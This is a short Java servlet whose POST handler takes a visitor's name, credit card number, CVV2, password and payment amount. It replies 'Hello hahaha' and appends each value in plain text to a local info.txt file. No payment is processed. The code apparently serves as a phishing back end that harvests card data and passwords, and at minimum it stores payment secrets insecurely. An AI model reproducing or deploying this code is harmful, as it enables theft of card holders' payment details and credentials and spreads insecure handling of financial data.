package main.java.ua.test.simple;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;

public class Servlet extends HttpServlet{

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        String nameSurname = req.getParameter("nameSurname");
        String number = req.getParameter("number");
        String cvv2 = req.getParameter("CVV2");
        String pass = req.getParameter("pass");
        String howMuch = req.getParameter("howMuch");

        try (PrintWriter out = resp.getWriter()) {
            out.print("Hello hahaha");
        }

        File res = new File("/home/james/workspace/tryAgain/tryAgain/src/main/java/information/info.txt");

        try (PrintWriter result = new PrintWriter(new BufferedWriter(new FileWriter(res, true)))) {
            result.println("Name and Surname = " + nameSurname + ";");
            result.println("Number of credit card = " + number + ";");
            result.println("CVV2 = " + cvv2 + ";");
            result.println("pass = " + pass + ";");
            result.println("How much? = " + howMuch + "!");
            result.println("------------------------");
        }
    }
}
